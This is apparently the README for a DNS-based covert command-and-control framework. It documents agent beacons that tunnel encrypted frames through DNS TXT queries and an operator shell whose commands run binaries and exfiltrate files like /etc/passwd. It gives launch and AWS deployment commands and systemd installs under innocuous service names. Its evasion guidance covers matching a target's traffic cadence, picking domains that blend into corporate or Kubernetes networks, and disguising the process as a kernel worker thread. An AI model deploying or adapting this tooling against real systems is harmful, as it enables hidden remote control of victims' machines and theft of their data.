

# DNS C&C Framework — Technical Reference

Covert command-and-control channel tunnelling encrypted frames inside DNS TXT
queries (client→server) and responses (server→client).  Both endpoints use
Scapy raw AF_PACKET sockets — the OS resolver is never in the path.

---

## Architecture

```
  SERVER                                          CLIENT
  ──────                                          ──────
  cnc_handler.py  (operator shell)
        │ outbound_queue
  cnc_session.py  (ARQ dispatcher)          agent_beacon.py  (heartbeat loop)
        │ l3_socket.send                          │ l3_socket.send
        ▼                                         ▼
    ┌──────────────────────────────────────────────────┐
    │   UDP / DNS TXT   (raw IP, bypasses resolver)    │
    │                                                  │
    │  query  : base32hex QNAME labels + EDNS0         │
    │  response: base32 TXT char-string + SOA + TTL    │
    └──────────────────────────────────────────────────┘
        ▲                                         ▲
  scapy AsyncSniffer (AF_PACKET)           scapy AsyncSniffer (AF_PACKET)
  cnc_session.py  (frame verify/queue)     agent_session.py  (frame verify/queue)
```

**Shared library** `common/src/common/`:
- `cnc_core.py` — DNS framing, ChaCha20+HMAC, ARQ helpers, jitter
- `cnc_crypto.py` — X25519 ECDH, Ed25519 sign/verify, HKDF-SHA256, PSK

---

## Crypto & Protocol

| Layer | Mechanism |
|---|---|
| Server identity | Ed25519 keypair; public key pinned in client as `SERVER_IDENTITY_PUB_HEX` |
| Bootstrap PSK | HKDF-SHA256 over server Ed25519 pubkey — no hardcoded secret |
| Handshake | X25519 ephemeral ECDH; server signs its ephemeral pubkey with Ed25519; client verifies before deriving session key |
| Frame encryption | ChaCha20 with nonce `(net_opcode, transfer_id, seq_id)` |
| Frame integrity | HMAC-SHA256 truncated to 16 B over header+ciphertext |
| Key zeroization | Session key overwritten in RAM on teardown (`destroy_session_crypto`) |
| ARQ | Stop-and-Wait; adaptive timeout `max(0.5s, RTT×3)` with 1.5× backoff; 5 retries before reconnect |

**QNAME encoding:** frame bytes → base32hex-lowercase `[0-9a-v]` → split into
63-char DNS labels → append C2 domain suffix.  Default max-FQDN is 120 chars
(two ~57-char labels, resembling a CDN hash subdomain), yielding 41 B
application data per query.  Use `--max-qname 253` for maximum throughput
(123 B/query, full FQDN).  Every beacon has a unique QNAME because the
ChaCha20 nonce includes the monotonic `transfer_id`.

**TXT RDATA encoding:** server base32-encodes (uppercase) the response frame as
a proper DNS char-string with a 1-byte length prefix.

**Traffic blending:** random source port per query, EDNS0 OPT record, jittered
TTL [30–300 s] on responses, SOA authority record, log-normal beacon jitter.

---

## Setup

### 1 — Dependencies

```bash
pip install -r requirements.txt
pip install -e common/          # editable install of shared library
```

### 2 — Generate server keypair

```bash
python3 server/key_creation.py
# Writes server/.env.server (chmod 600) and prints the public key hex
```

### 3 — Embed public key in client

In `client/agent_session.py`:
```python
SERVER_IDENTITY_PUB_HEX = "<hex from key_creation.py>"
```

Rebuild and redeploy the client whenever the server key is rotated.

---

## Running

### Server

```bash
sudo .venv/bin/python3 server/cnc_handler.py -i eth0 -d <CLIENT_IP> --domain <SUFFIX>
```

Wrap in `cnc_wrapper.py` to guarantee iptables cleanup even on SIGKILL:

```bash
sudo .venv/bin/python3 server/cnc_wrapper.py --port 53 -- \
    .venv/bin/python3 server/cnc_handler.py -i eth0 -d <CLIENT_IP> --domain <SUFFIX>
```

Install as a systemd service (wraps automatically, adds `ExecStopPost` cleanup):

```bash
sudo .venv/bin/python3 server/cnc_handler.py -i eth0 -d <CLIENT_IP> \
    --domain <SUFFIX> --install-service
sudo systemctl enable --now dns-monitor
```

**Server flags:**

| Flag | Default | Description |
|---|---|---|
| `-i`, `--interface` | required | Network interface |
| `-d`, `--destination-ip` | required | Client IPv4 |
| `--domain` | `q.c2` | DNS suffix — match on client |
| `--port` | `53` | UDP listen port |
| `--max-qname` | `120` | Max FQDN length in queries (64–253); lower = stealthier |
| `--install-service` | off | Write systemd unit and exit (needs root) |

**Operator shell commands:**
```
>> ls /path          # list directory on client
>> run /bin/cmd      # execute binary on client
>> copy /etc/passwd  # exfiltrate file → saved to received_files/
>> get /path         # alias for copy
>> exit              # send SHUTDOWN, terminate session
```

### Client

```bash
sudo .venv/bin/python3 client/agent_beacon.py -i eth0 -d <SERVER_IP> --domain <SUFFIX>
```

**Client flags:**

| Flag | Default | Description |
|---|---|---|
| `-i`, `--interface` | required | Network interface |
| `-d`, `--server-ip` | required | Server IPv4 |
| `--domain` | `q.c2` | DNS suffix — must match server |
| `--port` | `53` | Server UDP port |
| `--heartbeat` | `10.0` | Median beacon interval (seconds) |
| `--max-qname` | `120` | Max FQDN length in queries (64–253); lower = stealthier |
| `--daemon` | off | Double-fork, detach from terminal |
| `--log` | `/dev/null` | Log file path (daemon mode) |
| `--install-service` | off | Write systemd unit and exit (needs root) |
| `--simulate-drop` | off | Drop 15% of ACKs (ARQ stress test) |

Install client as systemd service:

```bash
sudo .venv/bin/python3 client/agent_beacon.py -i eth0 -d <SERVER_IP> \
    --domain <SUFFIX> --install-service
sudo systemctl enable --now network-monitor
```

---

## Local Testing (single machine)

Use a non-standard port — bypasses the OS resolver entirely, no loopback IP tricks needed:

```bash
# Terminal 1
sudo .venv/bin/python3 server/cnc_handler.py -i lo -d 127.0.0.1 --port 5353

# Terminal 2
sudo .venv/bin/python3 client/agent_beacon.py -i lo -d 127.0.0.1 --port 5353
```

---

## AWS Deployment

`deploy_server.sh` uploads the server identity key to SSM, rsyncs server code
to EC2, installs dependencies, and verifies SSM access:

```bash
./deploy_server.sh <EC2_PUBLIC_IP>
# or: EC2_HOST=1.2.3.4 ./deploy_server.sh
```

| Variable | Default | Purpose |
|---|---|---|
| `EC2_HOST` | required | EC2 public IPv4 |
| `AWS_DEFAULT_REGION` | `il-central-1` | AWS region |
| `EC2_USER` | `ubuntu` | SSH username |
| `KEY_FILE` | `./cnc-server-key.pem` | EC2 SSH key |
| `REMOTE_DIR` | `/home/ubuntu/cnc` | Remote directory |

The EC2 IAM role needs `ssm:GetParameter` on `/cnc/server_private_hex`.

---

## Operational Hardening

| Goal | How |
|---|---|
| Blend beacon timing | `--heartbeat <s>` — match target's polling cadence (e.g. `300` on enterprise networks) |
| Avoid port-53 interception | `--port 5353` (mDNS range) or `--port 443` + UDP ACCEPT firewall rule (blends with QUIC) |
| Domain that fits target context | `--domain update.corp.internal` on Windows domain; `--domain telemetry.prod.svc` on k8s |
| Rotate server identity per engagement | Re-run `key_creation.py`, re-embed pubkey in client, redeploy |
| SIGKILL-safe cleanup | Use `cnc_wrapper.py` or `--install-service` (both add iptables cleanup after any crash) |

---

## Security Properties

| Property | Mechanism |
|---|---|
| Server authentication | Ed25519 signature verified against pinned pubkey |
| Forward secrecy | X25519 ephemeral keypair discarded after handshake |
| Frame confidentiality | ChaCha20, per-frame unique nonce |
| Frame integrity | HMAC-SHA256 (16 B) |
| Key zeroization | Session key wiped on teardown |
| Unique QNAME per beacon | Monotonic `transfer_id` → unique nonce → unique ciphertext → unique QNAME; no cache hits |
| QNAME blending | `[0-9a-v]` alphabet resembles CDN hash subdomains |
| No binary TXT records | Base32 char-string with length prefix |
| Response TTL blending | Random [30–300 s] |
| Authoritative appearance | SOA in authority section |
| OS resolver bypass | AF_PACKET pre-iptables capture; drain socket + iptables fallback |
| Source port randomization | Fresh random port per query |
| Process concealment | `setproctitle("[kworker/u2:0]")` + optional daemon mode |
| Path traversal prevention | `O_NOFOLLOW`, `commonpath` on all file operations |
| SIGKILL resilience | Wrapper `finally` + systemd `ExecStopPost` + startup stale-rule cleanup |
| Handshake rate limiting | New HS_INIT from a different ephemeral key rejected within 5 s of last accepted handshake — prevents ECDH-exhaustion floods |
